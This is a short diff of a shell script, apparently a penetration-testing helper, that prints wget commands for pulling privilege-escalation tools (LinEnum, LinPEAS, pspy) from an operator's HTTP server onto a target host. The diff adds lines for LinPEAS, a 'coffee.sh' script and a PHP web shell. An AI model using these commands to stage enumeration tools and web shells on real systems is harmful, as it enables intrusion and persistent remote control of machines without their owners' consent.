@@ -43,6 +43,9 @@ while read line
   echo "wget \"http://$line:8000/SH/LinEnum.sh\""
   echo "wget \"http://$line:8000/SH/LinEnumPlus.sh\""
   echo "wget \"http://$line:8000/SH/LinPe.sh\""
+  echo "wget \"http://$line:8000/SH/LinPEAS.sh\""
+  echo "wget \"http://$line:8000/SH/coffee.sh\""
+  echo "wget \"http://$line:8000/PHP/webshell.php\""
   echo "wget \"http://$line:8000/ELF/pspy32\""
   echo "wget \"http://$line:8000/ELF/pspy64\""
   
